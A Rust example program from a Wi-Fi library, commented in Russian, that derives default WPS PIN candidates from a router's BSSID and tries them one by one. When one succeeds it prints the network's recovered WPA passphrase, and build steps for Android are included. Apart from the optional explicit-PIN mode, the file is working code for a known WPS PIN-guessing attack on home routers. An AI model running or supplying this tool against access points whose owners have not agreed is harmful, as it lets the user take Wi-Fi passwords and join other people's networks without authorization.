//! Генерирует WPS PIN по `BSSID` и подключается к сети.
//!
//! Если PIN не передан аргументом, кандидаты строятся по `BSSID` и
//! пробуются по порядку, пока точка доступа не примет один из них.
//!
//! Запуск (нужен `root` или `CAP_NET_RAW`/`CAP_NET_ADMIN`):
//!
//! ```text
//! cargo run --features tracing --example wps_pin_connect -- wlan0 LP d4:6e:0e:bf:1f:46
//! cargo run --features tracing --example wps_pin_connect -- wlan0 LP d4:6e:0e:bf:1f:46 48293563
//! ```
//!
//! Сборка под Android (`arm64-v8a`, API 33):
//!
//! ```text
//! cargo ndk -t arm64-v8a -P 33 build --release --example wps_pin_connect
//! ```

use uu_linux_kernel_wlan::{Error, MacAddr, Result, Wlan};

/// Сколько PIN-кандидатов пробовать за один запуск.
const MAX_PIN_ATTEMPTS: usize = 8;

fn main() -> Result<()> {
    init_tracing();

    let mut args = std::env::args().skip(1);
    let ifname = args.next().unwrap_or_else(|| "wlan0".to_string());
    let ssid = args.next().unwrap_or_else(|| "LP".to_string());
    let bssid: MacAddr = args.next().unwrap_or_default().parse()?;
    let explicit_pin = args.next();

    let mut wlan = Wlan::open(&ifname)?;
    let pins = pin_list(&mut wlan, bssid, explicit_pin.as_deref())?;
    if pins.is_empty() {
        return Err(Error::Message(format!("no WPS PIN candidates for {bssid}")));
    }
    println!(
        "{} PIN candidate(s) for {ssid} ({bssid}): {}",
        pins.len(),
        pins.join(", ")
    );

    let mut last_error = None;
    for pin in &pins {
        println!("trying PIN {pin}");
        match wlan.wps_pin_psk(ssid.as_bytes(), bssid, pin) {
            Ok(credentials) => {
                println!("SSID: {}", String::from_utf8_lossy(&credentials.ssid));
                println!("PSK:  {}", credentials.psk());
                println!("auth: {:#06x}", credentials.auth_type);
                println!("encr: {:#06x}", credentials.encryption_type);
                if let Some(mac) = credentials.mac_addr {
                    println!("mac:  {mac}");
                }
                return Ok(());
            }
            Err(error) => {
                eprintln!("PIN {pin} rejected: {error}");
                last_error = Some(error);
            }
        }
    }
    Err(last_error.unwrap_or_else(|| Error::Message("no PIN was tried".to_string())))
}

/// Возвращает список PIN-кандидатов: явный PIN или сгенерированные по `BSSID`.
fn pin_list(wlan: &mut Wlan, bssid: MacAddr, explicit: Option<&str>) -> Result<Vec<String>> {
    if let Some(pin) = explicit {
        return Ok(vec![pin.to_string()]);
    }
    let target = wlan
        .scan()?
        .into_iter()
        .find(|bss| bss.bssid == bssid && bss.is_wps());
    let mut pins = target.map_or_else(Vec::new, |bss| bss.wps_pins());
    pins.truncate(MAX_PIN_ATTEMPTS);
    Ok(pins)
}

/// Включает логи по `RUST_LOG`, если крейт собран с фичей `tracing`.
#[cfg(feature = "tracing")]
fn init_tracing() {
    use tracing_subscriber::EnvFilter;

    let filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("off"));
    let _ = tracing_subscriber::fmt()
        .with_env_filter(filter)
        .with_writer(std::io::stderr)
        .try_init();
}

/// Без фичи `tracing` логировать нечего.
#[cfg(not(feature = "tracing"))]
const fn init_tracing() {}
